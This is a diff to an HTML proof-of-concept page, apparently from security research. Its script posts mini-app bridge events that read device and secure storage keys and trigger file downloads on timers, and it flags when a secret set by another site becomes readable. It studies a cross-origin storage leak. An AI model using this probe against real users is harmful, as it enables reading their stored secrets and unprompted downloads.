@@ -16,7 +16,7 @@ const big=document.getElementById('big');
 const s=document.getElementById('s');
 const TS=Date.now().toString(36);
 window.WebApp={sendEvent:function(n,d){
-  s.textContent="<= "+n+" "+d;
+  const line=document.createElement('div'); line.textContent="<= "+n+" "+d; s.appendChild(line);
   if(String(d).indexOf("SECRET-SHARED-VALUE")>=0){ big.textContent="ПРОЧИТАНО С ЧУЖОГО САЙТА: "+d; big.style.borderColor="#c00"; }
 }};
 function post(name,obj){
@@ -26,5 +26,11 @@ function post(name,obj){
 setTimeout(function(){post("WebAppDeviceStorageGetKey",{requestId:"xread-"+TS,key:"probe-secret-shared"})},1200);
 setTimeout(function(){post("WebAppDownloadFile",{url:"https://nbafan00.github.io/dl-check/probe.txt",file_name:"probe-auto1s-"+TS+".txt"})},1000);
 setTimeout(function(){post("WebAppDownloadFile",{url:"https://nbafan00.github.io/dl-check/probe.txt",file_name:"probe-auto5s-"+TS+".txt"})},5000);
+const rb=document.createElement('button');
+rb.textContent="ПРОЧИТАТЬ ХРАНИЛИЩЕ ЕЩЁ РАЗ";
+rb.style.cssText="width:100%;padding:14px;font:inherit;font-size:16px;font-weight:bold;background:#dfd;border:2px solid #484;border-radius:8px;cursor:pointer;margin-top:8px";
+rb.onclick=function(){post("WebAppDeviceStorageGetKey",{requestId:"xread2-"+TS,key:"probe-secret-shared"});
+  setTimeout(function(){post("WebAppSecureStorageGetKey",{requestId:"xsec2-"+TS,key:"probe-secret-sec"})},400);};
+document.body.appendChild(rb);
 ]]></script>
 </body></html>
